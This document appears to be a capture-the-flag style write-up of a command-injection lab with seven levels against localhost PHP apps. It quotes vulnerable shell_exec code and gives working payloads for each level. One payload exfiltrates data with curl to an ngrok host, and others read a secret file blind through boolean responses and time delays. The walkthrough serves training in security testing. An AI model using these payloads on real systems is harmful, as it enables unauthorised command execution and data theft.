@@ -1,0 +1,335 @@
+[Level 1]
+
+[*] Target: http://localhost:3001
+
+    - Look at the php code:
+
+        <?php
+            if(isset($_POST['command'],$_POST['target'])){
+                $command = $_POST['command'];
+                $target = $_POST['target'];
+                switch($command) {
+                    case "ping":
+                        $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+                        break;
+                    case "nslookup":
+                        $result = shell_exec("timeout 10 nslookup $target 2>&1");
+                        break;	
+                    case "dig":
+                        $result = shell_exec("timeout 10 dig $target 2>&1");
+                        break;
+                }
+                die($result);
+            }
+        ?>
+
+    => shell_exec can be used to execute command it, and $target is the user www-data input
+
+    => In this situation, there is no filter or any kind of protection so I gonna solve this in the classic way
+
+    => shell_exec("timeout 10 ping -c 4 127.0.0.1; id 2>&1");
+
+        PING 127.0.0.1 (127.0.0.1): 56 data bytes
+        64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.038 ms
+        64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.103 ms
+        64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.145 ms
+        64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.104 ms
+        --- 127.0.0.1 ping statistics ---
+        4 packets transmitted, 4 packets received, 0% packet loss
+        round-trip min/avg/max/stddev = 0.038/0.097/0.145/0.038 ms
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+    - This is where the fun begins, I think you might try this before
+
+    =>  bigbox@ubuntu:~/Desktop$ dig
+
+        ; <<>> DiG 9.18.12-1ubuntu1.2-Ubuntu <<>>
+
+    => This shit is my os version, so basically, it prints out this variable from somewhere right
+
+        bigbox@ubuntu:~/Desktop$ dig whoami
+
+        ; <<>> DiG 9.18.12-1ubuntu1.2-Ubuntu <<>> whoami
+
+        --------------------------------------------------
+
+        bigbox@ubuntu:~/Desktop$ dig $(whoami)
+
+        ; <<>> DiG 9.18.12-1ubuntu1.2-Ubuntu <<>> bigbox
+
+    => shell_exec("timeout 10 dig $(whoami) 2>&1");
+
+    => ; <<>> DiG 9.11.5-P4-5.1+deb10u9-Debian <<>> www-data
+
+    [Final Result: RCE] 127.0.0.1; id 2>&1 => ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:3002
+
+    - So! There is a small guardian in this lab
+
+        ...
+        if(isset($_POST['command'],$_POST['target'])){
+                $command = $_POST['command'];
+                $target = $_POST['target'];
+                if (strpos($target, ";") !== false) // [?] prevent us to use ';'
+                    die("Hacker detected!");
+                switch($command) {
+                    case "ping":
+                        $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+                        break;
+        ...
+        }}
+    => ya know, there are tons of operators in many other languages, and either in bash
+
+        command1 && command2
+
+        command1 & command2
+
+        command1 || command2
+
+        ....
+
+    => shell_exec("timeout 10 ping -c 4 127.0.0.1 && id 2>&1");
+
+        PING 127.0.0.1 (127.0.0.1): 56 data bytes
+        64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.037 ms
+        64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
+        64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.058 ms
+        64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.105 ms
+        --- 127.0.0.1 ping statistics ---
+        4 packets transmitted, 4 packets received, 0% packet loss
+        round-trip min/avg/max/stddev = 0.037/0.061/0.105/0.026 ms
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+    [Final Result: RCE] 127.0.0.1 && id 2>&1 => ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:3003
+
+    - What a challenge! 
+
+        if(isset($_POST['command'],$_POST['target'])){
+            $command = $_POST['command'];
+            $target = $_POST['target'];
+            if (strpos($target, ";") !== false) 
+                die("Hacker detected!");
+            if (strpos($target, "&") !== false) 
+                die("Hacker detected!");
+            if (strpos($target, "|") !== false) 
+                die("Hacker detected!");
+            switch($command) {
+                case "ping":
+                    $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+                    echo "<br>" . $result. "<br>";
+                    break; }}
+
+    => But there is no ban to "$" or "(", ")"
+
+    => In this case, we can use the dig trick
+
+    => shell_exec("timeout 10 dig $(id) 2>&1");
+
+    => ; <<>> DiG 9.11.5-P4-5.1+deb10u9-Debian <<>> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+       ...
+
+    => However, if you do something like this, 2 commands still can be run normally
+
+        bigbox@ubuntu:~/Desktop$ pwd
+        whoami
+        /home/bigbox/Desktop
+        bigbox
+
+    => But ya can't just use \n in another language because bash script doesn't work like that
+
+        => timeout 10 nslookup \n whoami 2>&1
+
+    => Even though URL encoding can help ya
+
+        POST /index.php HTTP/1.1
+        Host: localhost:3003
+        ...
+        command=nslookup&target=127.0.0.1+%0A+whoami
+
+    =>  This is the result:
+
+        <br>timeout 10 nslookup 127.0.0.1 
+        whoami 2>&1<br>** server can't find 1.0.0.127.in-addr.arpa: NXDOMAIN
+
+        www-data
+        
+    [Final Result: RCE] 127.0.0.1+%0A+whoami => www-data
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:3004
+
+    - Big problem right! nowhere to print out the result, and it took me days to find out da way
+
+        $command = $_POST['command'];
+        $target = $_POST['target'];
+        switch($command) {
+			case "backup":
+				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
+                if ($result !== null && strpos($result, "zip error") === false)
+                    die("Backup thành công");
+                else
+                    die("Backup không thành công");
+				break;
+        }
+
+    - So! the logic to solve this is based on the http request
+
+        $ python3 -m http.server 4444
+        Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+        127.0.0.1 - - [12/Oct/2023 15:43:21] code 404, message File not found
+        127.0.0.1 - - [12/Oct/2023 15:43:21] "GET /print_out_whatever_ya_want HTTP/1.1" 404 -
+
+    - Using ngrok is a wise choice, since our target is docker container so something might not work as it should 
+
+    => shell_exec("timeout 3 zip /tmp/; curl "https://myngrok.com/$(pwd | base64)"; -r /var/www /html/index.php 2>&1")
+
+    => GET /L3Zhci93d3cvaHRtbAo=      502 Bad Gateway <=> /var/www/html
+
+    [Final Result: RCE] ; curl "https://myngrok.com/$(pwd | base64)"; => GET /L3Zhci93d3cvaHRtbAo=
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5]
+
+[*] Target: http://localhost:3005
+
+    - Okay! if you just look at this lab's code, it is the same as the previous one, but pay attention to the setting in the docker-compose.yml
+
+        ...
+        level05-proxy:
+            image: nginx:stable
+            ports:
+            - "3005:80"
+            volumes:
+            - ./cmdi_level5/config/nginx.conf:/etc/nginx/conf.d/default.conf
+            restart: always
+            networks:
+            - internet
+            - no-internet // [?] ngrok trick is now useless
+        ...
+
+    => This shit took me a lot of time to figure out the solution, and it's kinda stupid
+
+        RUN chown -R root:www-data /var/www/html
+        RUN chmod 750 /var/www/html
+        RUN find . -type f -exec chmod 640 {} \;
+        RUN find . -type d -exec chmod 750 {} \;
+
+        RUN chmod +t -R /var/www/html/
+
+    => You know what! www-data has the right to write or create files to the /var/www/html, which means
+
+       shell_exec("timeout 3 zip /tmp/; touch cmd_output.txt; echo "$(pwd)" > cmd_output.txt ; -r /var/www /html/index.php 2>&1")
+
+    => $ curl http://localhost:3005/cmd_output.txt => /var/www/html
+
+    [Final Result: RCE] ; touch cmd_output.txt; echo "$(pwd)" > cmd_output.txt ; => curl http://localhost:3005/cmd_output.txt => /var/www/html
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 6]
+
+[*] Target: http://localhost:3006
+
+    - If you see through this lab, ya may see no difference, however! the previous lab's payload will not work in this situation since
+
+        level06:
+            build: ./cmdi_level6
+            container_name: 'cmdi_level06'
+            restart: 'unless-stopped'
+            volumes: 
+            - ./cmdi_level6/src/:/var/www/html/:ro 
+
+    => No permission to write
+
+    - Because of that, I fixed the source code a little bit to see things easier
+
+                $result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
+
+                echo "timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1";
+
+                print_r($result);
+
+    =>  timeout 3 zip /tmp/; echo "$(pwd)" > output.txt ; -r /var/www/html/index.php 2>&1
+        zip error: Nothing to do! (/tmp/.zip)
+
+        timeout 3 zip /tmp/test.zip -r /var/www/html/index.php 2>&1  adding: var/www/html/index.php (deflated 43%)
+        Backup thành công
+
+    => I don't wanna say but this case may only be solved by a boolean test, which means I would guess each character until it's done
+
+        test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "C" ]; then echo ""; else echo "zip error"; fi ; #
+
+        <=> timeout 3 zip /tmp/test.zip -r /var/www/html/index.php 2>&1
+
+            if [ "$(cat /secret.txt | cut -c 1)" = "C" ]; then
+                echo ""
+            else
+                echo "zip error"
+            fi
+            
+        =>   Backup thành công
+
+        test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then echo ""; else echo "zip error"; fi ; #
+
+        <=> timeout 3 zip /tmp/test.zip -r /var/www/html/index.php 2>&1
+
+            if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then
+                echo ""
+            else
+                echo "zip error"
+            fi
+            
+        => Backup không thành công
+
+    => Of course no stupid shit would rather test this manually, so I create a wordlist that contains all characters in the keyboard 
+       and then fuzz them orderly using "cluster bomb" mode in burp suite
+
+    [Final Result: Able to RCE and read file's content] CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 7]
+
+[*] Target: http://localhost:3007
+
+    - This time no where to check the boolean, but there still be sleep trick which is usually used in SQL guessing, and in this case, it is kinda of usefull
+
+        switch($command) {
+			case "backup":
+                # Backup to /tmp/ folder and prevent writable to document root 
+				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
+                die("Đã chạy câu lệnh backup");
+                break;  
+
+    - test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then sleep 3; else echo sleep 0; fi ; #
+
+    => So if the guess is correct the response will response for a little bit longer like 3 seconds after that you have your result
+
+    [Final Result: Able to RCE and read file's content] CBJS{FAKE_FLAG_FAKE_FLAG}
